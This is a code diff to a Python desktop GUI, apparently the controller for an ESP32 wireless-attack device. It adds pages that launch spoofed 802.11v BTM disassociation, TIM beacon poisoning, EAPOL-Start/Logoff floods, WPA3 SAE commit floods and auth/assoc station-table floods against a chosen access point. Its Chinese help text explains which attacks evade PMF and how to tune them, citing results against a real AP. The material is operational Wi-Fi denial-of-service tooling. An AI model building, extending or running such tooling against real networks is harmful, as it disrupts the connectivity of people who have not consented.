@@ -50,6 +50,11 @@ MENU = [
     ("delba", "DELBA 欺骗"),
     ("ba", "BA 会话攻击"),
     ("evil", "Evil Twin"),
+    ("wnm", "WNM 劝退"),
+    ("tim", "TIM 投毒"),
+    ("eapol", "EAPOL 洪泛"),
+    ("sae", "SAE 洪泛"),
+    ("authflood", "Auth 洪泛"),
     ("status", "设备状态"),
     ("log", "日志"),
 ]
@@ -64,6 +69,32 @@ DEAUTH_MODES = [
 
 
 BA_STEPS = ["512", "256", "1024", "2047", "0 (对照：不推窗口)"]
+
+# 五个管理/数据帧模块的参数选项（文本里的英文前缀就是命令行 token）
+WNM_MODES = [
+    "cand - 带候选 BSS（推荐：客户端被导向一个不存在的 BSSID）",
+    "bare - 不带候选列表（客户端只会自己扫一遍）",
+]
+TIM_MODES = [
+    "tim - 置位：声称有缓存，客户端一直醒着来取",
+    "clear - 清空：客户端睡过真实下行",
+]
+EAPOL_TIDS = [
+    "6 - QoS TID6（默认，wpa_supplicant 的 EAPOL TID）",
+    "-1 - 只发非 QoS 数据帧",
+    "0 - QoS TID0",
+    "5 - QoS TID5",
+    "7 - QoS TID7",
+]
+SAE_ELEMS = [
+    "point - P-256 生成元（默认：让 AP 走完昂贵那一步）",
+    "rand - 随机点（对照组：AP 在校验阶段就丢弃）",
+]
+AUTH_MODES = [
+    "both - 认证 + 关联（默认，一个身份两条帧）",
+    "auth - 只发 Authentication",
+    "assoc - 只发 Association Request",
+]
 
 DELBA_REASONS = [
     "37 - 不再使用该机制",
@@ -323,6 +354,19 @@ class DeautherApp:
         self.delba_label = None
         self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
         self.ba_label = None
+        # 五个管理/数据帧页面共用：key -> 目标行 label
+        self.mod_labels = {}
+        self.wnm_mode_var = tk.StringVar(value=WNM_MODES[0])
+        self.wnm_timer_var = tk.StringVar(value="10")
+        self.wnm_ch_var = tk.StringVar(value="0")
+        self.tim_mode_var = tk.StringVar(value=TIM_MODES[0])
+        self.tim_aid_var = tk.StringVar(value="0")
+        self.eapol_tid_var = tk.StringVar(value=EAPOL_TIDS[0])
+        self.eapol_mac_var = tk.StringVar()
+        self.sae_elem_var = tk.StringVar(value=SAE_ELEMS[0])
+        self.sae_gap_var = tk.StringVar(value="50")
+        self.auth_mode_var = tk.StringVar(value=AUTH_MODES[0])
+        self.auth_auto_var = tk.BooleanVar(value=True)
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -383,6 +427,11 @@ class DeautherApp:
         self.pages["delba"] = self._build_delba_page()
         self.pages["ba"] = self._build_ba_page()
         self.pages["evil"] = self._build_evil_page()
+        self.pages["wnm"] = self._build_wnm_page()
+        self.pages["tim"] = self._build_tim_page()
+        self.pages["eapol"] = self._build_eapol_page()
+        self.pages["sae"] = self._build_sae_page()
+        self.pages["authflood"] = self._build_authflood_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
 
@@ -492,7 +541,7 @@ class DeautherApp:
         ttk.Label(
             page,
             text="伪造 AP 的 CSA：在目标信道上按 count 递减播报，然后跳到新信道用克隆 beacon 接应。"
-                 "CSA 不受 802.11w/PMF 保护。",
+                 "Action 帧属于 robust（PMF 会拦），beacon 里的 CSA IE 不受保护——两条都发。",
             foreground="#777777",
         ).pack(anchor="w", pady=(0, 8))
 
@@ -537,7 +586,7 @@ class DeautherApp:
         ttk.Label(
             page,
             text="伪造 AP 发 DELBA（Category 3 / Action 2），把客户端的块确认会话拆掉："
-                 "链路还在，聚合没了，吞吐量掉到单帧确认。DELBA 不是 robust 管理帧，PMF 不校验。",
+                 "链路还在，聚合没了，吞吐量掉到单帧确认。DELBA 属于 robust 管理帧类别，PMF 强制时会拦，实测是非 PMF 链路。",
             foreground="#777777", wraplength=900, justify="left",
         ).pack(anchor="w", pady=(0, 8))
 
@@ -660,6 +709,218 @@ class DeautherApp:
         self.creds_btn.pack(side="left")
         return page
 
+    # ------------------------------------------- 802.11v / TIM / EAPOL / SAE / Auth
+
+    def _target_bar(self, page, key):
+        """扫描 / 选目标 + 目标行：五页共用（都是单 AP 目标）。"""
+        bar = ttk.Frame(page)
+        bar.pack(fill="x", pady=(0, 6))
+        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
+        btn.pack(side="left")
+        self.scan_btns[key] = btn
+        tbtn = ttk.Button(bar, text="选择目标…", width=13,
+                          command=lambda: self.open_targets(False), state="disabled")
+        tbtn.pack(side="left", padx=6)
+        self.target_btns[key] = tbtn
+        label = ttk.Label(bar, text="未扫描")
+        label.pack(side="left", padx=10)
+        self.mod_labels[key] = label
+        return bar
+
+    def _build_wnm_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="802.11v BTM Request 欺骗（劝退 STA）",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="伪造 AP 发 WNM Action（category 10 / action 7）：Disassociation Imminent 置位，"
+                 "客户端于是“自愿”漫游或离网。它属于 robust 管理帧类别：PMF 关闭/可选（大多数 WPA2）时有效，强制 PMF 时被驱动丢弃。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "wnm")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="模式：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.wnm_mode_var, values=WNM_MODES,
+                     state="readonly", width=44).pack(side="left")
+        ttk.Label(params, text="  disassoc timer：").pack(side="left")
+        ttk.Entry(params, textvariable=self.wnm_timer_var, width=6).pack(side="left")
+        ttk.Label(params, text="  tbtt").pack(side="left")
+        ttk.Label(params, text="  候选信道（0=自动）：").pack(side="left")
+        ttk.Entry(params, textvariable=self.wnm_ch_var, width=6).pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始 BTM", width=14, command=self.start_wnm).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.wnm_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 只对声明支持 11v 的 STA 生效（Extended Capabilities 的 BSS Transition 位），"
+                  "不支持的会被跳过，计数在 wnmskip；\n"
+                  "• timer 必须 ≥1，填 0 客户端不会扫；每 300 ms 对每个客户端重发一次，最多 8 个；\n"
+                  "• 底栏：wnmf 已发帧、wnmc 支持 11v 的客户端、wnmskip 被跳过的、"
+                  "wnmresp 客户端回的 BTM Response 数、wnms 回的状态码。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_tim_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="TIM 投毒（克隆 beacon 篡改省电位图）",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="克隆目标 AP 的 beacon（同 BSSID/SSID/RSN/capability/interval），只改 TIM 元素："
+                 "按 AID 置位让客户端白等，或清空让它睡过真实下行。beacon 不受 PMF 保护。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "tim")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="模式：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.tim_mode_var, values=TIM_MODES,
+                     state="readonly", width=38).pack(side="left")
+        ttk.Label(params, text="  受害 AID（0=学到的全部）：").pack(side="left")
+        ttk.Entry(params, textvariable=self.tim_aid_var, width=6).pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始克隆", width=14, command=self.start_tim).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.tim_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 必须先听到目标 AP 的真 beacon 才会发第一帧（否则克隆出来是个“坏网络”），"
+                  "timreal 就是这个计数；\n"
+                  "• AID 不在 beacon 里，它来自 Association Response，靠嗅探学习；学不到时按 AID 1 兜底；\n"
+                  "• 克隆 beacon 每 20 ms 一帧（真 AP 100 TU≈102 ms），是广播帧，不占单播缓存池；\n"
+                  "• TSF 投毒已删除：beacon 的时间戳字段由 MAC 用自己的 TSF 覆盖，写什么都上不了空口；\n"
+                  "• 底栏：timf 帧数、timaid 学到的 AID 位图、timreal 学到的真 beacon 数。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_eapol_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="EAPOL-Start / Logoff 洪泛",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="伪造成受害 STA 发 EAPOL-Start / Logoff（ToDS 数据帧 + LLC/SNAP 0x888E），"
+                 "反复重起 AP 的 802.1X 状态机 / 把端口打回未授权态。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "eapol")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="QoS TID：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.eapol_tid_var, values=EAPOL_TIDS,
+                     state="readonly", width=40).pack(side="left")
+        ttk.Label(params, text="  受害 STA MAC（空=嗅探学习）：").pack(side="left")
+        ttk.Entry(params, textvariable=self.eapol_mac_var, width=14).pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_eapol).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.eapol_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• MAC 填 12 位十六进制、不带冒号（例如 02AABBCCDDEE）；留空就只打嗅探到的真实 STA；\n"
+                  "• 非 QoS 与 QoS（TID 由上表决定）两种帧交替发，每 50 ms 一帧、轮转受害者，"
+                  "单播注入上限 20 帧/s；\n"
+                  "• WPA2-Enterprise 语义最完整；WPA2-PSK 下是否有效取决于 AP 实现，实测这台 AP 无效；\n"
+                  "• 判据在对端：eaprxreq（AP 发回的 EAP-Request/Identity）>0 才算把状态机踢动了，"
+                  "eaprxsta 是真实 STA 重新认证的帧数。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_sae_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="SAE Commit 洪泛（WPA3 DoS）",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="向 WPA3-SAE 的 AP 灌伪造 Authentication Commit：每个身份一个 ECC 标量乘。"
+                 "AP 用反 clogging token（status 76）时，模块会把 token 原样回显再送一次。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "sae")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="Commit 元素：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.sae_elem_var, values=SAE_ELEMS,
+                     state="readonly", width=40).pack(side="left")
+        ttk.Label(params, text="  帧间隔 ms：").pack(side="left")
+        ttk.Entry(params, textvariable=self.sae_gap_var, width=6).pack(side="left")
+        ttk.Label(params, text="   （低于 50 会被固件抬到 50）", foreground="#555555").pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_sae).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.sae_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• saesec 是嗅探判定的目标安全类型：只对 wpa3-sae / wpa2/wpa3 有意义，"
+                  "wpa2-psk 上 AP 不会做 ECC 运算；\n"
+                  "• point 用 P-256 生成元（合法点），AP 才会走到标量乘；rand 是对照组；\n"
+                  "• 每个身份发 4 帧后换随机 MAC，最多 8 个身份在轮转；\n"
+                  "• 底栏：saef 帧数、saec 身份数、saeresp AP 回帧数、saecode 最后状态码"
+                  "（76=要 token、0/13=其他）、saetok token 数、saeecho 带 token 的帧数。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_authflood_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="Auth / Assoc 洪泛（WPA3 自动升级 SAE）",
+                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="每个随机身份先发 Authentication 再发 Association Request，挤占 AP 的 station 表；"
+                 "嗅到目标 AKM 是 SAE 时自动改成 SAE Commit 洪泛。",
+            foreground="#777777", wraplength=920, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+        self._target_bar(page, "authflood")
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="模式：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.auth_mode_var, values=AUTH_MODES,
+                     state="readonly", width=40).pack(side="left")
+        ttk.Checkbutton(params, text="嗅到 WPA3 自动升级 SAE",
+                        variable=self.auth_auto_var).pack(side="left", padx=12)
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_authflood).pack(side="left")
+        ttk.Button(actions, text="停止", width=10,
+                   command=self.authflood_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• Association Request 带目标自己的 SSID 和 RSN 元素（嗅探自 beacon），"
+                  "否则 AP 在查 station 表之前就拒了，洪泛等于白打；\n"
+                  "• 每次成功发一帧就换一个新身份；afids 是身份数、afs 是 AP 的回帧数；\n"
+                  "• afst 是最后一次状态码：0=接受了我们的伪造身份、13=不做开放认证、"
+                  "17=station 表满；afup=1 表示已升级为 SAE 洪泛；\n"
+                  "• 关掉“自动升级”就只打 Auth/Assoc（对照组）。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
     def _build_status_page(self):
         page = self._make_page()
         ttk.Button(page, text="刷新", width=10,
@@ -683,9 +944,10 @@ class DeautherApp:
     # ---------------------------------------------------------------- 导航
 
     def go_back(self):
-        parent = {"one": "deauth", "all": "deauth", "only": "deauth", "except": "deauth",
-                  "deauth": "home", "probe": "home", "evil": "home", "status": "home",
-                  "log": "home"}
+        parent = {"one": "deauth", "all": "deauth", "only": "deauth", "except": "deauth"}
+        for key in ("deauth", "probe", "csa", "delba", "ba", "evil", "wnm", "tim", "eapol",
+                    "sae", "authflood", "status", "log"):
+            parent[key] = "home"
         self.show_page(parent.get(self.current_page, "home"))
 
     def show_page(self, key):
@@ -698,6 +960,9 @@ class DeautherApp:
         self.back_btn.config(state="normal" if key != "home" else "disabled")
         titles = dict(MENU + [("home", "主菜单")])
         titles.update({k: f"Deauth · {label}" for k, label, _n, _h in DEAUTH_MODES})
+        titles.update({"wnm": "802.11v BTM Request", "tim": "TIM 投毒",
+                       "eapol": "EAPOL-Start/Logoff 洪泛", "sae": "SAE Commit 洪泛",
+                       "authflood": "Auth/Assoc 洪泛"})
         self.page_title.config(text=titles.get(key, key))
         self._refresh_labels()
 
@@ -834,6 +1099,18 @@ class DeautherApp:
                 ssid = self.networks[str(single)]["ssid"] or "(隐藏)"
                 ch = self.networks[str(single)]["channel"]
                 self.csa_label.config(text=f"目标：#{single} {ssid}（当前 ch{ch}）→ 自动对向频段")
+
+        for key, widget in self.mod_labels.items():
+            if self.scanning:
+                widget.config(text="扫描中…")
+            elif not self.networks:
+                widget.config(text="未扫描")
+            elif single is None or str(single) not in self.networks:
+                widget.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
+            else:
+                net = self.networks[str(single)]
+                widget.config(text=f"目标：#{single} {net['ssid'] or '(隐藏)'}"
+                                   f"（ch{net['channel']}）")
 
         if "evil" in self.count_labels:
             widget = self.count_labels["evil"]
@@ -976,6 +1253,107 @@ class DeautherApp:
     def ba_stop(self):
         self._send("BASTOP")
 
+    # ------------------------------------------- 802.11v / TIM / EAPOL / SAE / Auth
+
+    def _need_single(self, title):
+        if not self._require_link():
+            return False
+        if not self.networks:
+            messagebox.showinfo("提示", "先点“扫描 AP”。")
+            return False
+        if self.single_index is None:
+            messagebox.showerror(f"{title} 参数无效", "先在“选择目标…”里选一个 AP。")
+            return False
+        return True
+
+    def start_wnm(self):
+        if not self._need_single("BTM"):
+            return
+        mode = self.wnm_mode_var.get().split(" ")[0]
+        try:
+            timer = int(self.wnm_timer_var.get().strip() or "0")
+            channel = int(self.wnm_ch_var.get().strip() or "0")
+        except ValueError:
+            messagebox.showerror("BTM 参数无效", "disassoc timer 与候选信道必须是整数。")
+            return
+        if not 1 <= timer <= 65535:
+            messagebox.showerror("BTM 参数无效", "disassoc timer 必须在 1..65535（0 客户端不会扫）。")
+            return
+        if not 0 <= channel <= 196:
+            messagebox.showerror("BTM 参数无效", "候选信道必须是 0（自动）或 1..196。")
+            return
+        command = f"WNM {self.single_index} {mode} {timer}"
+        if channel:
+            command += f" {channel}"
+        self._send(command)
+
+    def wnm_stop(self):
+        self._send("WNMSTOP")
+
+    def start_tim(self):
+        if not self._need_single("TIM"):
+            return
+        mode = self.tim_mode_var.get().split(" ")[0]
+        try:
+            aid = int(self.tim_aid_var.get().strip() or "0")
+        except ValueError:
+            messagebox.showerror("TIM 参数无效", "AID 必须是整数。")
+            return
+        if not 0 <= aid <= 256:
+            messagebox.showerror("TIM 参数无效", "AID 必须是 0（学到的全部）或 1..256。")
+            return
+        self._send(f"TIM {self.single_index} {mode} {aid}")
+
+    def tim_stop(self):
+        self._send("TIMSTOP")
+
+    def start_eapol(self):
+        if not self._need_single("EAPOL"):
+            return
+        tid = self.eapol_tid_var.get().split(" ")[0]
+        mac = self.eapol_mac_var.get().strip().upper().replace(":", "").replace("-", "")
+        if mac:
+            if len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac):
+                messagebox.showerror("EAPOL 参数无效",
+                                     "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
+                return
+        command = f"EAPOL {self.single_index} {tid}"
+        if mac:
+            command += f" {mac}"
+        self._send(command)
+
+    def eapol_stop(self):
+        self._send("EAPOLSTOP")
+
+    def start_sae(self):
+        if not self._need_single("SAE"):
+            return
+        element = self.sae_elem_var.get().split(" ")[0]
+        try:
+            gap = int(self.sae_gap_var.get().strip() or "0")
+        except ValueError:
+            messagebox.showerror("SAE 参数无效", "帧间隔必须是整数毫秒。")
+            return
+        if not 0 <= gap <= 1000:
+            messagebox.showerror("SAE 参数无效", "帧间隔必须在 0..1000 ms。")
+            return
+        self._send(f"SAE {self.single_index} {element} {gap}")
+
+    def sae_stop(self):
+        self._send("SAESTOP")
+
+    def start_authflood(self):
+        if not self._need_single("Auth 洪泛"):
+            return
+        mode = self.auth_mode_var.get().split(" ")[0]
+        command = f"AUTHFLOOD {self.single_index} {mode}"
+        if not self.auth_auto_var.get():
+            command += " noauto"
+        self._send(command)
+
+    def authflood_stop(self):
+        self._send("AUTHFLOODSTOP")
+
     def stop(self):
         self._send("STOP")
 
@@ -1041,6 +1419,7 @@ class DeautherApp:
             self.attacking = protocol.mode_is_attacking(mode)
             self.twin_stop_btn.config(state="normal" if mode.startswith("evil") else "disabled")
             band_hint = "  双频(5G)：可用" if self.supports_5g else ""
+            # 两行：第一行是“还在跑的”，第二行是五个帧级模块的计数。
             self.status_var.set(
                 f"模式：{mode}    Deauth 帧：{payload.get('deauth_frames', '-')}    "
                 f"Probe 帧：{payload.get('probe_frames', '-')}    "
@@ -1048,16 +1427,31 @@ class DeautherApp:
                 f"({payload.get('csaf', '-')} 帧)    DELBA：{payload.get('delba', '-')} "
                 f"({payload.get('delbaf', '-')} 帧 / TID {payload.get('delbat', '-')})    "
                 f"BA：{'on' if payload.get('bamode') == '1' else 'off'} "
-                f"({payload.get('babar', '-')} BAR / SSN {payload.get('bassn', '-')})    "
-                f"网络：{payload.get('networks', '-')}"
-                f"    堆：{payload.get('heap', '-')}{band_hint}"
+                f"({payload.get('babar', '-')} BAR / SSN {payload.get('bassn', '-')})\n"
+                f"WNM：{payload.get('wnm', '-')} ({payload.get('wnmf', '-')} 帧 / "
+                f"{payload.get('wnmc', '-')} 个 11v STA)    "
+                f"TIM：{payload.get('tim', '-')} ({payload.get('timf', '-')} 帧 / "
+                f"aid=0x{int(payload.get('timaid', '0') or '0'):X})    "
+                f"EAPOL：{payload.get('eap', '-')} ({payload.get('eapf', '-')} 帧 / "
+                f"AP 回 {payload.get('eaprxreq', '-')})    "
+                f"SAE：{payload.get('sae', '-')} ({payload.get('saef', '-')} 帧 / "
+                f"{payload.get('saesec', '-')})    "
+                f"Auth：{payload.get('af', '-')} ({payload.get('aff', '-')} 帧)    "
+                f"网络：{payload.get('networks', '-')}    堆：{payload.get('heap', '-')}"
+                f"{band_hint}"
             )
             self.status_text.configure(state="normal")
             self.status_text.delete("1.0", "end")
             for key in ("mode", "eliminated", "deauth_frames", "probe_frames", "networks", "creds",
                         "heap", "ui", "caps", "ch", "rx", "rxm",
                         "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr",
-                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant"):
+                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant",
+                        "wnm", "wnmf", "wnmc", "wnmskip", "wnmresp", "wnms",
+                        "tim", "timf", "timaid", "timreal",
+                        "eap", "eapf", "eaprx", "eaprxreq", "eaprxsta",
+                        "sae", "saesec", "saef", "saec", "saeresp", "saecode", "saetok", "saeecho",
+                        "af", "aff", "afa", "afs", "afids", "afst", "afup",
+                        "txg", "txgok", "txgerr"):
                 if key in payload:
                     self.status_text.insert("end", f"{key:<14}{payload[key]}\n")
             self.status_text.configure(state="disabled")
